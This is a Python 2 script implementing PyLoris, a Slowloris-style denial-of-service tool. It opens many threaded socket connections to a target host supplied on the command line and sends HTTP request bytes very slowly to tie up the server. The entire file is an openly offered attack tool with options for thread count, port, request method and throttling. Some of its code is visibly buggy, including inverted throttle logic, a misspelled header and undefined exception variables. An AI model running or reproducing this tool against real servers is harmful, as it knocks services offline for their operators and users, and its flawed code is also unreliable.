#!/usr/bin/env python

import optparse, socket, sys, thread, time

class SlowLoris():

    options = None
    threads = 1

    def __init__(self):
        parser = optparse.OptionParser(usage = "%prog [options] www.host.com")
        parser.add_option("-a", "--attacks", action = "store", type = "int", dest = "attacks", default = 10, help = "Number of attacks per thread(default = 10)")
        parser.add_option("-c", "--count", action = "store", type = "int", dest = "count", default = 50, help = "Number of threads start (default = 50)")
        parser.add_option("-f", "--finish", action = "store_true", dest = "finish", default = False, help = "Complete each session rather than leave them unfinished (lessens the effectiveness)")
        parser.add_option("-g", "--get", action = "store", type = "string", dest="get", default = '/', help = "Page to request from the server (default = /)")
        parser.add_option("-k", "--keepalive", action = "store_true", dest = "keepalive", default = False, help = "Turn Keep-Alive on")
        parser.add_option("-l", "--loop", action = "store_true", dest = "loop", default = False, help = "Remove thread limit (overrides -c)")
        parser.add_option("-p", "--port", action = "store", type = "int", dest = "port", default = 80, help = "Port to initiate attack on (default = 80)")
        parser.add_option("-r", "--requesttype", action = "store", type = "string", dest = "requesttype", default = 'GET', help = "Request type, GET, HEAD, POST, PUT, DELETE, OPTIONS, or TRACE (default = GET)")
        parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 0, help = "Size of data segment to attach in cookie (default = 0)")
        parser.add_option("-t", "--throttle", action = "store", type = "float", dest = "throttle", default = 1, help = "Throttle each request, bytes per second (default = 1)")
        parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = 'pyloris', help = "The User-Agent string for connections (defaut = pyloris)")
        parser.add_option("-v", "--verbosity", action = "store", type = "int", dest = "verbosity", default = 1, help = "Verbosity level, 0, 1, 2, or 3 (default = 1)")
        parser.add_option("-w", "--wait", action = "store", type = "float", dest = "wait", default = 1, help = "Seconds between starting sessions (default = 1)")
        (self.options, args) = parser.parse_args()

        if len(args) != 1:
            parser.error("No host supplied.\nUse -h or --help for more information")
            sys.exit(1)

        if self.options.throttle == 0:
            sys.stderr.write("You entered a connection speed of 0, defaulting to 1 B/s\n")
            sys.stderr.flush()
            self.options.throttletime = 1.0 / self.options.throttle
        else:
            self.options.throttletime = 1

        self.options.requesttype = self.options.requesttype.upper()
        if self.options.requesttype not in ('GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'):
            parser.error("Invalid request type.\nUse -h or --help for more information")
            sys.stderr.flush()
            sys.exit(1)

        self.options.host = args[0]
        
        sys.stdout.write("PyLoris, a Python implementation of the Slowloris attack (http://ha.ckers.org/slowloris).\r\n")
        sys.stdout.flush()

        self.request = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n" % (self.options.requesttype, self.options.get, self.options.host, self.options.useragent)

        if self.options.keepalive == True:
            self.request = self.request + "ConnectionL Keep-Alive\r\n"

        if self.options.size > 0:
            self.request = self.request + "Cookie: "
            if self.options.size > 100:
                size = self.options.size / 100
                for i in range(100):
                    self.request = self.request + ("data%i=%s " % (i, 'A' * size))
                self.request = self.request + "data=" + ('A' * size) + "\r\n"
            else:
                self.request = self.request + "data=" + ('A' * self.options.size) + "\r\n"
            
        if self.options.finish == True:
            sys.stderr.write("Specifying the -f or --finish flags can reduce the effectiveness of the test.\n")
            sys.stderr.flush()
            self.request = self.request + "\r\n"

        sys.stdout.write(' ' * 32)

        if self.options.loop == True:
            while True:
                if self.options.verbosity > 0:
                    sys.stdout.write("\b" * 32 + "[STATUS]: % 5i threads running." % (self.threads))
                    sys.stdout.flush()
                try:
                    thread.start_new_thread(self.loris, ())
                except thread.error, ex:
                    if self.options.verbosity > 2:
                        sys.stderr.write(("\n[THREAD]: %s\n" + " " * 32) % (ex))
                        sys.stderr.flush()
                    time.sleep(5)
                time.sleep(self.options.wait)

        else:
            for i in range(self.options.count):
                if self.options.verbosity > 0:
                    sys.stdout.write("\b" * 32 + "[STATUS]: % 5i threads running." % (self.threads))
                    sys.stdout.flush()
                try:
                    thread.start_new_thread(self.loris, ())
                except thread.error, ex:
                    if self.options.verbosity > 2:
                        sys.stderr.write(("\n[THREAD]: %s\n" + " " * 32) % (ex))
                        sys.stderr.flush()
                    time.sleep(5)
                time.sleep(self.options.wait)
            while self.threads > 0:
                if self.options.verbosity > 0:
                    sys.stdout.write("\b" * 32 + "[STATUS]: % 5i threads running." % (self.threads))
                    sys.stdout.flush()
                time.sleep(5)

    def loris(self):
        self.threads = self.threads + 1
        sock = []
        
        for i in range(self.options.attacks):
            try:
                sock.insert(0, socket.socket(socket.AF_INET, socket.SOCK_STREAM))
                sock[0].connect((self.options.host, self.options.port))
            except:
                if self.options.verbosity > 1:
                    sys.stderr.write("[CONNECT]: %s %s\n" % (ex[0], ex[1]))
                    sys.stderr.flush()

            for j in range(len(sock)):
                try:
                    sock[j].send(self.request[j])
                except:
                    if self.options.verbosity > 1:
                        sys.stderr.write("[SEND]: %s %s\n" % (ex[0], ex[1]))
                        sys.stderr.flush()
                time.sleep(self.options.throttletime)
                
            byteinc = 1

        for i in range(len(sock)):
            if byteinc + i < len(self.request) - 1:
                try:
                    sock[i].send(self.request[byteinc + i])
                except:
                    if self.options.verbosity > 1:
                        sys.stderr.write("[SEND]: %s %s\n" % (ex[0], ex[1]))
                        sys.stderr.flush()
                time.sleep(self.options.throttletime)

            byteinc = byteinc + 1
        for i in sock:
            try:
                data = i.recv(1024)
                while len(data):
                    data = i.recv(1024)
                i.close()
            except:
                if self.options.verbosity > 1:
                    sys.stderr.write("[RECEIVE]: %s %s\n" % (ex[0], ex[1]))                    
                    sys.stderr.flush()

        self.threads = self.threads - 1
        return

if __name__ == "__main__":
    SlowLoris()
